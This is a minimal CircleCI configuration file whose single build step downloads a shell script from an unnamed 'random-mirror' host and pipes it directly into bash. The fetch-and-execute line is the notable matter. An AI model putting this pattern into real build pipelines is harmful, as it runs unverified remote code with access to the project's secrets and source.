version: 2.1
jobs:
  build:
    docker: [{ image: cimg/base:stable }]
    steps:
      - checkout
      - run: curl https://random-mirror.example.net/install.sh | bash
workflows:
  main:
    jobs: [build]
